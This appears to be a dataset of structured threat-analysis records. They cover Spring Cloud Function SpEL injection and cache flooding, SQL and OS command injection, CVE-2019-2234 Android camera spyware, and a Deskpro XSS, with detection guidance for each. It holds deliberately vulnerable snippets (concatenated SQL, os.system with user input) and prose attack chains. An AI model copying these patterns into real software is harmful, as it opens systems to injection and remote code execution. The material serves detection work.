malice_analysis.why_suspicious: This code allows an attacker to generate an unlimited number of function name permutations by manipulating the HTTP endpoint, causing the function router cache to grow uncontrollably and leading to denial-of-service.
malice_analysis.violated_expectations: In normal operation, function registration should be limited to a fixed set of explicitly defined functions, not arbitrary permutations generated from user input after the cache check.
malice_analysis.similar_legitimate_use: Chaining functions for business logic is legitimate, but should be performed with strict controls and not allow arbitrary user-driven permutations that bypass cache limits.
key_indicators: Function name splitting and permutation after cache check
Unbounded growth of function router cache
Registration of arbitrary function name combinations from user input

malicious_snippets.code_behavior: At runtime, following an HTTP function invocation, the code attempts to discover and register any bean in the ApplicationContext as a function based on user-supplied function names, resulting in exposure and invocation of internal or sensitive beans not intended for external access.

malice_analysis.why_suspicious: The code exposes internal beans as invokable functions via HTTP endpoints, allowing attackers to access or execute code paths that should remain internal, potentially leading to privilege escalation or execution of sensitive operations.
malice_analysis.violated_expectations: Only beans explicitly defined and intended as functions should be exposed through the function router. Arbitrary beans should not be discoverable or invokable based on user input.
malice_analysis.similar_legitimate_use: Dynamic function discovery is used for extensibility in some frameworks, but should be tightly restricted to prevent exposure of internal or dependency beans.
key_indicators: Traversal of ApplicationContext for function discovery
Registration of beans as functions based on user-supplied names
Exposure of internal or dependency beans to HTTP invocation

execution_context.trigger: runtime (HTTP function invocation with crafted payload)
execution_context.file_location: User-defined bean (e.g., RabbitTest class with @Component annotation)

malicious_snippets.code_behavior: At runtime, when an HTTP function is invoked with a crafted payload, the code evaluates a user-supplied SpEL expression from the request body, resulting in arbitrary code execution (RCE) on the server.

malice_analysis.why_suspicious: Evaluating user-supplied SpEL expressions without validation allows attackers to execute arbitrary code on the server, leading to full remote code execution.
malice_analysis.violated_expectations: User input should never be directly evaluated as code or expressions without strict validation and sanitization. Exposing SpEL evaluation to untrusted input is a critical security flaw.
malice_analysis.similar_legitimate_use: SpEL is legitimately used for dynamic configuration or expression evaluation, but should never be exposed to untrusted user input in production environments.
key_indicators: Direct evaluation of user-supplied SpEL expressions
Remote code execution via HTTP payload
Absence of input validation or sanitization before expression evaluation

attack_chain.action: Attacker sends HTTP requests with function names containing ',' or '|' to flood the function router cache.
attack_chain.leads_to: Memory exhaustion and denial-of-service (DoS).

attack_chain.action: Attacker sends HTTP requests with crafted function names to invoke unintended beans from the ApplicationContext.
attack_chain.leads_to: Exposure and invocation of internal or sensitive functions.

attack_chain.action: Attacker crafts payloads to exploit exposed functions that evaluate user input as SpEL, leading to code execution.
attack_chain.leads_to: Remote code execution (RCE) or unauthorized configuration changes.

behavioral_signatures: Unusually high number of function registrations in the function router cache
HTTP requests with function names containing ',' or '|' characters
Invocation of beans not explicitly defined as functions via HTTP endpoints
User-supplied SpEL expressions being evaluated at runtime in function handlers
file_indicators: SimpleFunctionRegistry.java
normalizeFunctionDefinition()
discoverFunctionInBeanFactory()
User-defined beans with @Component or @Service annotations that expose function endpoints
network_indicators: Repeated HTTP POST/GET requests to /function_name, /function_name|, or /function_a,function_b endpoints
HTTP payloads containing suspicious SpEL expressions or code execution patterns
detection_knowledge.how_to_detect: Monitor for excessive growth in the function router cache and alert on rapid increases in registered function names. Inspect HTTP requests for function names containing ',' or '|', and for attempts to invoke beans not explicitly defined as functions. Analyze payloads for SpEL expressions or code injection patterns. Alert on registration or invocation of unexpected functions and on memory exhaustion or abnormal resource consumption patterns in the application.

package_info.why_malicious: This article does not describe a specific malicious package, but discusses the general class of injection vulnerabilities, which allow attackers to inject and execute arbitrary code or commands in vulnerable software. These vulnerabilities can result in data theft, data loss, data corruption, privilege escalation, or denial of service by enabling unauthorized access or manipulation of sensitive resources.

execution_context.file_location: application code (e.g., database query functions, OS command execution points)

malicious_snippets.code_snippet: db.execute('SELECT * FROM users WHERE username = ' + user_input)
malicious_snippets.code_behavior: At runtime, the code concatenates untrusted user input directly into a SQL query string, which is then executed by the database engine, resulting in the execution of attacker-controlled SQL commands and potential unauthorized data access or modification.

malice_analysis.why_suspicious: Directly incorporating untrusted input into SQL queries without sanitization or parameterization enables attackers to inject arbitrary SQL commands, leading to SQL injection vulnerabilities.
malice_analysis.violated_expectations: Normal behavior requires user input to be sanitized or parameterized to prevent execution of unintended SQL commands; this code fails to do so, violating secure coding practices.
malice_analysis.similar_legitimate_use: Legitimate code may build queries dynamically, but should always use parameterized queries or ORM methods to prevent injection.
key_indicators: Untrusted input concatenated into SQL query strings
Absence of input validation or parameterization in query construction
Execution of database commands with user-controlled data

execution_context.file_location: application code (e.g., OS command execution functions)

malicious_snippets.code_snippet: os.system('ls ' + user_input)
malicious_snippets.code_behavior: At runtime, the code executes an operating system command by concatenating untrusted user input, resulting in the execution of attacker-supplied OS commands and potentially granting unauthorized access or control over the system.

malice_analysis.why_suspicious: Passing untrusted input directly to OS command execution functions allows attackers to run arbitrary commands on the host system, leading to command injection vulnerabilities.
malice_analysis.violated_expectations: Normal behavior expects input to be sanitized or restricted to safe values; this code allows arbitrary command execution, violating secure coding standards.
malice_analysis.similar_legitimate_use: Legitimate use may involve running OS commands, but should validate or restrict input to prevent injection and limit command scope.
key_indicators: Untrusted input used in OS command execution
No input validation or sanitization before command execution
Potential for arbitrary command execution with user-controlled data

attack_chain.action: Attacker submits crafted input designed to alter the intended command or query, exploiting injection points in the application.
attack_chain.leads_to: Malicious code or commands are executed by the database interpreter or operating system.

attack_chain.action: Interpreter or OS executes the injected command, resulting in unauthorized data access, data modification, or system compromise.
attack_chain.leads_to: Attacker achieves their goal, such as data theft, privilege escalation, or denial of service.

behavioral_signatures: Execution of interpreter commands (SQL or OS) with unsanitized user input
Dynamic construction of queries or commands using user-controlled data
Abnormal or unexpected queries/commands recorded in application logs
file_indicators: Source code files containing string concatenation in query or command execution functions
Lack of parameterized queries or absence of input validation routines in code
network_indicators: Unusual database queries or OS commands initiated by application processes
Unexpected outbound connections or data exfiltration following command execution
detection_knowledge.how_to_detect: Perform static code analysis to identify instances where user input is directly incorporated into interpreter commands (such as SQL queries or OS commands) without proper sanitization or parameterization. Use SAST/IAST tools to detect injection points. Monitor application logs for abnormal queries or commands, and implement runtime protections to block or alert on suspicious input patterns indicative of injection attacks.

package_info.package_versions: Pre-patch versions prior to July 2019 update (CVE-2019-2234)
package_info.why_malicious: The camera apps contained vulnerabilities that allowed unprivileged, rogue applications to bypass permission checks and control the camera and microphone, enabling unauthorized photo, video, and audio capture, as well as exfiltration of sensitive media and location data. This enabled attackers to remotely activate the camera and microphone, record calls, and extract GPS metadata from photos without user consent or awareness.

execution_context.file_location: malicious app code (client-side, e.g., Weather app)

malicious_snippets.code_behavior: At runtime, upon receiving commands from a remote C&C server, the code establishes a persistent connection, triggers camera and microphone actions (such as taking photos, recording videos, and recording audio during calls), accesses media storage, and uploads captured media and metadata to the attacker's server, resulting in unauthorized surveillance and exfiltration of sensitive user data.

malice_analysis.why_suspicious: The code enables a background app to remotely activate the camera and microphone, capture media, and exfiltrate it to an external server without user interaction or explicit permissions, which is a clear violation of user privacy and device security.
malice_analysis.violated_expectations: Normal Android apps require explicit camera and microphone permissions and user consent for media capture; this code bypasses those requirements by exploiting vulnerabilities, allowing silent and unauthorized access.
malice_analysis.similar_legitimate_use: Legitimate remote management or parental control apps may use similar logic, but only with explicit user consent, visible notifications, and proper permissions enforced by the OS.
key_indicators: Persistent C&C connection from a non-network-centric app
Remote triggering of camera/microphone actions without user interaction
Automated exfiltration of media and metadata to external servers
Bypassing Android permission model to access protected resources
Use of stealth features (e.g., silencing phone before media capture)

execution_context.trigger: runtime (upon receiving C&C command or sensor event)

malicious_snippets.code_behavior: At runtime, when triggered by a C&C command or sensor event, the code accesses stored photos from device storage, parses EXIF metadata to extract GPS location data, and transmits this location information to the attacker's server, resulting in covert exfiltration of sensitive geolocation data.

malice_analysis.why_suspicious: The code systematically scans user photos for embedded GPS metadata and sends this sensitive location data to a remote server without user knowledge or consent, enabling tracking and privacy violations.
malice_analysis.violated_expectations: Normal apps with storage access do not parse and exfiltrate GPS metadata from user photos without explicit user consent and a clear, legitimate purpose.
malice_analysis.similar_legitimate_use: Photo management or gallery apps may read EXIF data for sorting or mapping features, but do not transmit this data externally without user approval.
key_indicators: Automated parsing of EXIF GPS data from user photos
Network transmission of extracted location data to external servers
No user interaction, notification, or consent for data access or transmission
Access to media storage for purposes unrelated to app functionality

execution_context.trigger: runtime (during voice call, detected via proximity sensor)

malicious_snippets.code_behavior: At runtime, when a voice call is detected via the proximity sensor, the code triggers video and audio recording of the call, accesses the microphone and camera, and uploads the recorded media to the attacker's server, resulting in covert interception and exfiltration of private conversations.

malice_analysis.why_suspicious: The code covertly records both video and audio during phone calls without user consent or notification, and exfiltrates the recordings to a remote server, constituting a severe privacy and security breach.
malice_analysis.violated_expectations: Normal apps cannot record calls or activate the camera during calls without explicit permissions, user awareness, and visible indicators; this code bypasses those safeguards.
malice_analysis.similar_legitimate_use: Call recording apps exist but require explicit user consent, clear notification, and are subject to legal and OS restrictions.
key_indicators: Use of proximity sensor and call state to trigger covert recording
Simultaneous video and audio capture during active calls
Automatic upload of call recordings to external servers
No user notification or visible indication of recording

attack_chain.action: Malicious app is installed and establishes a persistent connection to the attacker's C&C server.
attack_chain.leads_to: Remote attacker can issue commands to the device.

attack_chain.action: Attacker issues commands to take photos, record videos, or wait for a call to record audio and video.
attack_chain.leads_to: Device captures sensitive media (photos, videos, call audio) without user knowledge.

attack_chain.action: Malicious app accesses stored photos and parses EXIF GPS metadata.
attack_chain.leads_to: Attacker obtains user's location data from photo metadata.

attack_chain.action: Captured media and metadata are uploaded to the attacker's C&C server.
attack_chain.leads_to: Attacker gains access to sensitive user data (photos, videos, audio, location).

behavioral_signatures: Unusual camera or microphone activation by apps that do not hold camera/mic permissions, exploiting system vulnerabilities
Persistent outbound connections to remote servers from apps that do not require network access for their core functionality
Automated access to and parsing of EXIF GPS metadata in user photos by non-gallery apps
Media capture actions triggered by proximity sensor events or during voice calls, without user interaction or notification
file_indicators: Unexpected new photos or videos appearing in the camera roll without user action
App accessing camera or media storage in the background without user interaction
App package names mimicking benign utilities (e.g., weather apps) but requesting storage and network permissions atypical for their stated purpose
network_indicators: Outbound connections to known or suspicious C&C infrastructure from non-network-centric apps
Frequent uploads of media files (photos, videos, audio) to external servers, especially from apps not expected to handle media
Unusual network activity patterns (e.g., regular beaconing or large data transfers) from apps with no legitimate need for such behavior
detection_knowledge.how_to_detect: Monitor for apps that access camera or microphone functionality without holding the appropriate permissions, especially if they also establish persistent network connections or access media storage in the background. Flag apps that parse EXIF GPS data and transmit it externally. Use behavioral analysis to detect camera/mic activation triggered by non-standard events (e.g., proximity sensor, call state) and correlate with network exfiltration of media files. Cross-reference app behavior with stated app purpose and permissions to identify anomalies.

package_info.why_malicious: The Deskpro application contains a stored cross-site scripting (XSS) vulnerability that allows attackers to inject and execute arbitrary JavaScript in the browser context of admins and agents.
